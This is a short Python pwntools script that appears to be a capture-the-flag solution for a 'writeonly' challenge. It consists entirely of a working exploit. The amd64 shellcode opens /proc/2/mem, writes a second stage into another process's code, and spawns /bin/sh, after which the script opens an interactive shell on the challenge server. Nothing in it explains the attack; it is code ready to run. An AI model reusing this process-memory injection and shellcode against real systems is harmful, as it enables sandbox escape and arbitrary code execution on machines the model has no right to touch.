#!/usr/bin/python3
from pwn import remote, asm

shell = remote("writeonly.2020.ctfcompetition.com", 1337)

shellcode = asm("""
    push rax                    # actual address
    pop r15                     # $r15 = initial address

    push 0x6d656d               # $rsp = &"mem"
    mov rdi, 0x2f322f636f72702f # $rdi = /proc/2/
    push rdi                    # $rsp = &"/proc/2/mem"
    push rsp                    # &"/proc/2/mem"
    pop rdi                     # $rdi = &"/proc/2/mem"
    push 0x2                    # open()
    pop rax                     # $rax = open()
    push 0x1                    # flags
    pop rsi                     # $rsi = 0x1
    cdq                         # $rdx = 0x0
    syscall                     # syscall

    xchg rdi, rax               # $rdi = descriptor
    mov esi, 0x4022e3           # $rsi = offset
    push 0x8                    # lseek()
    pop rax                     # $rax = lseek()
    syscall                     # syscall

    push r15                    # initial address
    pop rsi                     # $rsi = initial address
    add rsi, 0x3b               # offset to shellcode
    push 0x15                   # shellcode len
    pop rdx                     # $rdx = shellcode len
    push 0x1                    # write()
    pop rax                     # $rax = write()
    syscall                     # syscall

    jmp $+0x0                   # loop

    push 0x3b                   # execve()
    pop rax                     # $rax = execve()
    cdq                         # $rdx = NULL
    push rdx                    # $rdx = &0x0
    pop rsi                     # $rsi = NULL
    mov rdi, 0x68732f6e69622f   # $rdi = "/bin/sh"
    push rdi                    # $rsp = &"/bin/sh"
    push rsp                    # &"/bin/sh"
    pop rdi                     # $rdi = &"/bin/sh"
    syscall                     # syscall
""", arch="amd64")

shell.sendlineafter(b"? ", str(len(shellcode)).encode())
shell.sendlineafter(b". ", shellcode)
shell.interactive()
